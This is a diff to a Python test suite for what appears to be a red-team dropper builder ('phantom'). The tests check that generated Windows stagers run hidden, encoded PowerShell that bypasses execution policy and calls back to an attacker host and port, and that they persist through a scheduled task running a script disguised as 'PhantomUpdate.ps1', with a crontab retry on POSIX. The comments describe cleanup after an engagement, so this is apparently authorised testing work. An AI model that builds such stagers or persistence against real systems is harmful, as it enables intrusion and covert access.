@@ -20,7 +20,9 @@ from phantom.utils.builder import (
     _RETRY_CACHE,
     _RETRY_MINUTES,
     _RETRY_SCRIPT,
+    _RETRY_SCRIPT_WIN,
     _RETRY_TASK_WIN,
+    _SCHTASKS_TR_MAX,
     _ps_resilient,
     _sh_resilient,
     generate_dropper,
@@ -71,13 +73,27 @@ class TestWindowsResilience:
         assert f"/mo {_RETRY_MINUTES}" in wrapped
         assert "/sc minute" in wrapped
 
-    def test_the_retry_action_carries_the_same_stager(self):
+    def test_the_retry_action_fits_the_schtasks_limit(self):
+        """The retry used to travel INLINE in /tr — and `schtasks` refuses
+        anything over 261 characters (live: "Il valore per l'opzione /tr non
+        può superare i 261 caratteri"), so the task was never created and
+        "resilient" was a one-shot. The retry now goes to a file."""
         core = "Write-Output 'core-marker'"
         wrapped = _ps_resilient(core)
-        action = re.search(r"/tr \"(.*?)\"\|Out-Null", wrapped).group(1)
-        assert action.startswith("powershell -NoP -NonI -W Hidden -Exec Bypass")
-        enc = action.rsplit("-Enc ", 1)[1]
-        assert core in base64.b64decode(enc).decode("utf-16-le")
+        action = re.search(r'/tr "(.*?)"\|Out-Null', wrapped).group(1)
+        assert len(action) <= _SCHTASKS_TR_MAX, action
+        assert "-File" in action                        # the file, not the blob
+        # the stager itself travels in the script the task runs
+        assert "core-marker" in wrapped
+        assert "PhantomUpdate.ps1" in wrapped
+
+    def test_the_retry_cleans_up_after_itself(self):
+        """A task that keeps firing every 5 minutes forever is a runaway; the
+        POSIX side removes its crontab line on success and Windows now does
+        the same with the task and the script file."""
+        wrapped = _ps_resilient("Invoke-It")
+        assert "schtasks /delete /f /tn" in wrapped
+        assert "Remove-Item" in wrapped
 
     def test_the_resilient_stager_is_one_runaway_free_command(self):
         cmd = generate_dropper("windows", LHOST, LPORT, use_ssl=True,
@@ -85,10 +101,12 @@ class TestWindowsResilience:
         assert cmd.startswith("powershell -NoP -NonI -W Hidden -Exec Bypass")
         inner = base64.b64decode(cmd.rsplit("-Enc ", 1)[1]).decode("utf-16-le")
         assert _RETRY_TASK_WIN in inner
-        # the endpoint is inside the retry, not only in the first attempt
-        assert LHOST in base64.b64decode(
-            re.search(r"-Enc (\S+)\"\|Out-Null", inner).group(1)
-        ).decode("utf-16-le")
+        # the endpoint is inside the retry, not only in the first attempt:
+        # it lands in the retry SCRIPT the task runs from disk
+        assert f"{LHOST}:{LPORT}" in inner
+        # and whatever the task is asked to run stays inside the /tr limit
+        action = re.search(r'/tr "(.*?)"\|Out-Null', inner).group(1)
+        assert len(action) <= _SCHTASKS_TR_MAX, action
 
 
 class TestPosixResilience:
@@ -139,6 +157,7 @@ class TestPosixResilience:
         # the cleanup section has to find the retry: a random name would
         # leave persistence behind after the engagement closes
         assert _RETRY_SCRIPT.startswith("~/.cache/")
+        assert _RETRY_SCRIPT_WIN.endswith("PhantomUpdate.ps1")
         assert _RETRY_TASK_WIN.isalnum()
 
 
